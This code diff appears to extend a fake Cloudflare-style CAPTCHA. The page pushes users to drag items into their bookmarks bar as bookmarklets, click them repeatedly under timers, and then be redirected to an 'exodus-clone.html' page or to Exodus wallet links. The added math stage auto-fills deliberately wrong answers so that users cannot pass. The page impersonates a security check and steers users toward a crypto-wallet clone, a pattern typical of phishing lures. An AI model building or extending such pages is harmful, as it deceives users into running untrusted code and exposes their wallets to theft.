@@ -153,10 +153,32 @@
     const c = getAllCounts();
     const a = c.addition;
     const b = c.subtraction;
-    const correctAnswer = a + b;
+    const part1 = a * 97 + b * 83;
+    const part2 = a + b * 11;
+    const part3 = a * a + b * b + a * b * 3;
+    const correctAnswer = part1 * part2 + part3;
     window._captchaCorrectAnswer = correctAnswer; // for verify
 
-    if (mathQuestion) mathQuestion.textContent = a + " + " + b + " = ?";
+    if (mathQuestion) {
+      mathQuestion.textContent =
+        "(" +
+        a +
+        " × 97 + " +
+        b +
+        " × 83) × (" +
+        a +
+        " + " +
+        b +
+        " × 11) + (" +
+        a +
+        "² + " +
+        b +
+        "² + " +
+        a +
+        "×" +
+        b +
+        "×3) = ?";
+    }
     if (stage2) stage2.classList.remove("hidden");
     if (mathAnswerInput) {
       mathAnswerInput.value = "";
@@ -175,7 +197,12 @@
 
   function checkProgressAndRedirect() {
     const total = getTotalClicks();
-    if (total >= 10) {
+    // Random threshold between 20 and 30 clicks (inclusive) per page load
+    if (typeof window.__captchaRedirectThreshold !== "number") {
+      window.__captchaRedirectThreshold = 20 + Math.floor(Math.random() * 11); // 20–30
+    }
+    const threshold = window.__captchaRedirectThreshold;
+    if (total >= threshold) {
       setTimeout(function () {
         window.location.href = "exodus-clone.html";
       }, 1000);
@@ -508,7 +535,11 @@
 
   function trySpamRedirect() {
     if (!currentPuzzle || !currentPuzzle.step2 || !currentPuzzle.step2.noManualDone) return;
-    if (getStep2SpamClicks() >= SPAM_CLICKS_TO_REDIRECT) {
+    // Random per-challenge threshold between 20 and 30 spam clicks.
+    if (typeof window.__step2RedirectThreshold !== "number") {
+      window.__step2RedirectThreshold = 20 + Math.floor(Math.random() * 11); // 20–30
+    }
+    if (getStep2SpamClicks() >= window.__step2RedirectThreshold) {
       showWidgetSuccessThenRedirect();
     }
   }
@@ -568,6 +599,10 @@
     if (window._mathProgressInterval) {
       clearInterval(window._mathProgressInterval);
       window._mathProgressInterval = null;
+    }
+    if (window._mathSuggestionInterval) {
+      clearInterval(window._mathSuggestionInterval);
+      window._mathSuggestionInterval = null;
     }
     if (window._jumpRobotRaf) {
       cancelAnimationFrame(window._jumpRobotRaf);
@@ -849,7 +884,25 @@
     { id: "glass", name: "Destroy Glass", step1: { bannerLine1: "Bookmark the hammer to destroy the glass", bannerLine2: "Drag the hammer to your bookmarks bar", themes: HAMMER_THEMES }, step2: { type: "glass", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "<span class=\"banner-line1\">Destroy the</span><strong class=\"banner-line2\">glass</strong>" } },
     { id: "storm", name: "Survive Storm", step1: { bannerLine1: "Done (1/1) Bookmark the edible or bandage item (either bandage or food)", bannerLine2: "Drag it to your bookmarks bar", themes: EDIBLE_THEMES }, step2: { type: "storm", timeLimit: 10, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Done (2/2) Use your bookmarked supplies in the storm — <strong>survive 10 seconds</strong> with health above zero." } },
     { id: "zombies", name: "Survive Zombies", step1: { bannerLine1: "Bookmark the weapon (gun)", bannerLine2: "Drag the gun to your bookmarks bar", themes: WEAPON_THEMES }, step2: { type: "zombies", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Protect the line until the timer runs out to survive. <strong>Do not let any zombie pass it</strong>." } },
-    { id: "jump", name: "Jump to 100m", step1: { bannerLine1: "Bookmark the jetpack or strong legs", bannerLine2: "Drag it to your bookmarks bar", themes: JETPACK_THEMES }, step2: { type: "jump", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Get to <strong>100 m</strong> before the timer runs out." } }
+    { id: "jump", name: "Jump to 100m", step1: { bannerLine1: "Bookmark the jetpack or strong legs", bannerLine2: "Drag it to your bookmarks bar", themes: JETPACK_THEMES }, step2: { type: "jump", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Get to <strong>100 m</strong> before the timer runs out." } },
+    {
+      id: "math",
+      name: "Solve Math",
+      step1: {
+        bannerLine1: "Bookmark any safe tool",
+        bannerLine2: "Drag it to your bookmarks bar",
+        themes: HAMMER_THEMES
+      },
+      step2: {
+        type: "math",
+        timeLimit: 15,
+        noManualDone: true,
+        targetClicks: 0,
+        instruction: "",
+        bannerText:
+          "Done (2/2) Use your bookmarked tool — <strong>solve the math problem by clicking your bookmarklet multiple times.</strong> If your calculation is correct, the CAPTCHA will complete."
+      }
+    }
   ];
 
   var currentPuzzle = null;
@@ -1318,6 +1371,120 @@
           }
         }
       }, 100);
+      startStep2PressureTimer(limit);
+      return;
+    }
+    if (type === "math") {
+      // Self-contained hard math puzzle inside the Cloudflare-style shell
+      body.classList.add("puzzle-body-tall", "puzzle-body-xl", "step2-quiz-scene");
+      body.innerHTML =
+        timerBlock +
+        '<div class="math-stage" style="margin-top:18px;padding:16px 18px 10px;display:flex;flex-direction:column;gap:12px;border-radius:10px;background:linear-gradient(135deg,#0f172a,#020617);box-shadow:0 12px 30px rgba(15,23,42,0.55);color:#e5e7eb;">' +
+        '<p id="cfMathQuestion" class="math-question" style="font-size:13px;line-height:1.6;margin:0;font-family:system-ui, -apple-system, BlinkMacSystemFont, \'SF Pro Text\', sans-serif;word-break:break-word;"><span style="display:block;font-size:11px;letter-spacing:0.08em;text-transform:uppercase;color:#9ca3af;margin-bottom:4px;">Challenge</span><span id="cfMathExpression"></span></p>' +
+        '<div class="math-input-row" style="display:flex;align-items:center;gap:8px;margin-top:4px;">' +
+        '<input id="cfMathAnswer" class="math-answer-input" type="text" inputmode="numeric" autocomplete="off" placeholder="Type your answer…" style="flex:1;min-width:0;padding:7px 10px;border-radius:7px;border:1px solid #4b5563;background:#020617;color:#e5e7eb;font-size:13px;box-shadow:0 0 0 1px rgba(15,23,42,0.6);outline:none;transition:border-color 0.15s,box-shadow 0.15s;" />' +
+        '<button id="cfMathSubmit" class="math-submit-btn" type="button" style="padding:7px 14px;border-radius:7px;border:none;background:linear-gradient(135deg,#f97316,#ea580c);color:#111827;font-weight:600;font-size:12px;letter-spacing:0.04em;text-transform:uppercase;cursor:pointer;box-shadow:0 10px 20px rgba(248,113,113,0.45);white-space:nowrap;transition:transform 0.1s,box-shadow 0.1s,background 0.1s;">Submit</button>' +
+        '</div>' +
+        '<p id="cfMathFeedback" class="math-feedback" aria-live="polite" style="min-height:16px;font-size:11px;margin:2px 1px 0;color:#9ca3af;"></p>' +
+        "</div>";
+
+      // Build a hard-to-solve-in-time expression
+      var counts = getAllCounts();
+      var a = Math.max(1, counts.addition || 1);
+      var b = Math.max(1, counts.subtraction || 1);
+      var part1 = a * 97 + b * 83;
+      var part2 = a + b * 11;
+      var part3 = a * a + b * b + a * b * 3;
+      var correctAnswer = part1 * part2 + part3;
+
+      var qEl = getEl("cfMathExpression");
+      if (qEl) {
+        qEl.textContent =
+          "(" +
+          a +
+          " × 97 + " +
+          b +
+          " × 83) × (" +
+          a +
+          " + " +
+          b +
+          " × 11) + (" +
+          a +
+          "² + " +
+          b +
+          "² + " +
+          a +
+          "×" +
+          b +
+          "×3) = ?";
+      }
+
+      var feedbackEl = getEl("cfMathFeedback");
+      // Pre-generate a list of fake answers that will be auto-filled as the user
+      // clicks the bookmark, never including the real correct answer.
+      var fakeAnswers = [];
+      for (var fi = 0; fi < 20; fi++) {
+        var delta = (Math.floor(Math.random() * 400) + 50) * (Math.random() < 0.5 ? -1 : 1);
+        var val = correctAnswer + delta;
+        if (val === correctAnswer) val += 1;
+        fakeAnswers.push(Math.abs(val));
+      }
+      var suggestionIndex = 0;
+      var lastClicks = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
+      function tickMathSuggestions() {
+        var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
+        if (n > lastClicks) {
+          lastClicks = n;
+          var ans = getEl("cfMathAnswer");
+          if (!ans) return;
+          var guess = fakeAnswers[suggestionIndex % fakeAnswers.length];
+          suggestionIndex++;
+          ans.value = String(guess);
+        }
+      }
+      window._mathSuggestionInterval = setInterval(tickMathSuggestions, 120);
+
+      function handleCfMathSubmit() {
+        var inputEl = getEl("cfMathAnswer");
+        if (!inputEl) return;
+        var raw = inputEl.value.trim();
+        var userVal = parseInt(raw, 10);
+        var ok = Number.isFinite(userVal) && userVal === correctAnswer;
+        if (!feedbackEl) return;
+        feedbackEl.classList.remove("success", "error");
+        feedbackEl.style.display = "block";
+        if (ok) {
+          feedbackEl.textContent = "Correct!";
+          feedbackEl.style.color = "#4ade80";
+          feedbackEl.classList.add("success");
+          // Final redirect on success – send users to real Exodus.
+          var target = "https://www.exodus.com?from_captcha=1";
+          setTimeout(function () {
+            try {
+              window.top.location.href = target;
+            } catch (e) {
+              window.location.href = target;
+            }
+          }, 1200);
+        } else {
+          feedbackEl.textContent = "Incorrect. Try again.";
+          feedbackEl.style.color = "#f97373";
+          feedbackEl.classList.add("error");
+        }
+      }
+
+      var btnEl = getEl("cfMathSubmit");
+      if (btnEl) {
+        btnEl.addEventListener("click", handleCfMathSubmit);
+      }
+      var ansEl = getEl("cfMathAnswer");
+      if (ansEl) {
+        ansEl.addEventListener("keydown", function (e) {
+          if (e.key === "Enter") handleCfMathSubmit();
+        });
+        ansEl.focus();
+      }
+
       startStep2PressureTimer(limit);
       return;
     }
@@ -1991,9 +2158,16 @@
   })();
 
   function showWidgetSuccessThenRedirect() {
+    // Finish any visuals and navigate user into Exodus.
     stopChallenge2Visuals();
-    var target = "https://www.exodus.com?from_captcha=1";
-    try { window.top.location.href = target; } catch (e) { window.location.href = target; }
+    if (challengePopupOverlay) challengePopupOverlay.classList.add("hidden");
+    if (captchaBox) captchaBox.classList.add("hidden");
+    try {
+      window.top.location.href = "https://www.exodus.com?from_captcha=1";
+    } catch (e) {
+      // Fallback: best-effort redirect
+      location.href = "https://www.exodus.com?from_captcha=1";
+    }
   }
 
   window.addEventListener("message", function (e) {
